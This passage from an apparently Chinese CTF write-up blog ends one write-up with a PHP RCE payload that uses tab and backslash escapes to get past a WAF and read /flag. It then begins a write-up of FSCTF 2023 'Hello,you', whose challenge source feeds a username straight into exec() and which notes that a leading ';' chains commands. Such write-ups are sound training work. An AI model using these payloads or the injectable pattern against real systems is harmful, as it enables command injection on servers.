<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?word=&lt;script%09language=&#34;php&#34;&gt;system(&#34;c\at%09/fl\ag&#34;);</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RCE</li>
<li>eval执行时用了php的结束标志?&gt;绕过</li>
<li>WAF绕过</li>
</ul>

item.title: 【FSCTF 2023】Hello,you
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="fsctf-2023helloyou" class="heading-element"><span>[FSCTF 2023]Hello,you</span>
 <a href="#fsctf-2023helloyou" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>我是在nss做的，好像原题flag位置不一样。</p>
<p>原题好像在根目录，但是nss这个在env</p>
</blockquote>
<h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>看页面源码可以得到部分源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$input = isset($_GET[&#39;input&#39;]) ? $_GET[&#39;input&#39;] : &#39;&#39;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 执行命令并返回结果
</span></span><span class="line"><span class="cl">function executeCommand($command) {
</span></span><span class="line"><span class="cl">$output = &#39;&#39;;
</span></span><span class="line"><span class="cl">exec($command, $output);
</span></span><span class="line"><span class="cl">return $output;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 注册用户
</span></span><span class="line"><span class="cl">function registerUser($username) {
</span></span><span class="line"><span class="cl">// .........
</span></span><span class="line"><span class="cl">$command = &#34;echo Hello, &#34; . $username;
</span></span><span class="line"><span class="cl">$result = executeCommand($command);
</span></span><span class="line"><span class="cl">return $result;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 处理注册请求
</span></span><span class="line"><span class="cl">if (isset($_POST[&#39;submit&#39;])) {
</span></span><span class="line"><span class="cl">$username = $_POST[&#39;username&#39;];
</span></span><span class="line"><span class="cl">$result = registerUser($username);
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>可以知道是<code>exec</code>直接执行指令</p>
</li>
<li>
<p>直接使用指令无法输出</p>
<p>这里的解释是一次执行多个命令，命令之间需要用连接符连接</p>
<blockquote>
<p>好像是这么说的吧，不确定</p>
<p>但是肯定是前面要加<code>;</code>才能执行</p>
</blockquote>
</li>
<li>
<p>根目录没有要在环境里面找</p>
</li>
</ul>
